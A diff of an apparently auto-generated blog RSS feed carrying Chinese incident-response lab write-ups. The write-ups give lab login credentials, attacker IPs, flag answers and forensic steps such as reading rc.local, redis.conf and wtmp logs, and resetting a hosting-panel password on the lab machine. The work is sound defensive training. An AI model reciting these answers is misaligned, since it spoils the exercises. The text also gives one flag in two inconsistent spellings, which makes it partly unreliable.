-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201516.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250301201516&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201516.png&#34; alt=&#34;Pasted image 20250301201516&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2747,8 +1664,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;192.168.75.129&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;2-第一个flag&#34;&gt;2. 第一个flag
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;2-第一个flag&#34;&gt;2. 第一个flag&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2760,16 +1677,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;得到第一个flag&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;thisismybaby&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201537.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250301201537&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201537.png&#34; alt=&#34;Pasted image 20250301201537&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2778,8 +1686,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;thisismybaby&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;3-第二个flag&#34;&gt;3. 第二个flag
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;3-第二个flag&#34;&gt;3. 第二个flag&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2795,16 +1703,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;我们cd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;rc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;下&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;使用ls&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;la&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;查看有rc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;直接用cat&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;rc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;local得到第二个flag&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201615.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250301201615&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201615.png&#34; alt=&#34;Pasted image 20250301201615&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2813,8 +1712,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;kfcvme50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;4-第三个flag&#34;&gt;4. 第三个flag
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;4-第三个flag&#34;&gt;4. 第三个flag&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -2822,16 +1721,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;我们通过查看log日志&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;我们发现一个redis日志文件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;然后看一下redis日志并没有什么结果&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;那么我们去看一下redis配置文件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;（&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;more&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;redis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;conf&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;）&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;就得到第三个flag&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201639.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250301201639&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201639.png&#34; alt=&#34;Pasted image 20250301201639&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2840,8 +1730,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssWrd_redis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;全部答案&#34;&gt;全部答案：
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;全部答案&#34;&gt;全部答案：&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2855,16 +1745,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssW0rd_redis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201658.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;Pasted image 20250301201658&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201658.png&#34; alt=&#34;Pasted image 20250301201658&#34;&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -2873,8 +1754,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
         <pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate>
         
         <guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux2/</guid>
-        <description>&lt;img src="http://localhost:1313/images/14.webp" alt="Featured image of post 【知攻善防靶场】Linux2" /&gt;&lt;h1 id=&#34;前提须知&#34;&gt;前提须知
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+        <description>&lt;img src="http://localhost:1313/images/14.webp" alt="Featured image of post 【知攻善防靶场】Linux2" /&gt;&lt;h1 id=&#34;前提须知&#34;&gt;前提须知&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2909,9 +1790,9 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;密码&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Inch&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;957821.&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;1-提交攻击者ip&#34;&gt;1. 提交攻击者IP
-&lt;/h1&gt;&lt;h3 id=&#34;方法一&#34;&gt;方法一：
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;1-提交攻击者ip&#34;&gt;1. 提交攻击者IP&lt;/h1&gt;
+&lt;h3 id=&#34;方法一&#34;&gt;方法一：&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2921,18 +1802,9 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;命令&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;last&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;wtmp&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015239.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;h3 id=&#34;方法二&#34;&gt;方法二：
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015239.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;方法二&#34;&gt;方法二：&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -2942,16 +1814,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;这里我看var目录文件时&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;看到了bt配置文件&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;那就bt看一下&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015259.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015259.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -2960,16 +1823,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;果然安装了宝塔&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;那就登录一下&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;因为不知道面板的密码那我们就直接修改一下面板的密码&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015315.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015315.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
 然后看一下面板的默认信息，看一下url地址&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2987,26 +1841,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;进行登录&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015356.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;br&gt;
-&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015404.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015356.png&#34; alt=&#34;image.png&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015404.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3017,16 +1853,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;使用命令&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cat&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;gerp&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015419.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image.png&#34;
-	
-	
-&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250829015419.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -3035,8 +1862,8 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;答案&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;192.168.20.1&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;2-提交攻击者修改的管理员密码明文&#34;&gt;2. 提交攻击者修改的管理员密码(明文)
-&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/div&gt;&lt;h1 id=&#34;2-提交攻击者修改的管理员密码明文&#34;&gt;2. 提交攻击者修改的管理员密码(明文)&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
@@ -3044,16 +1871,7 @@ web端口外部无法访问，请RDP连接上机排查&lt;/p&gt;
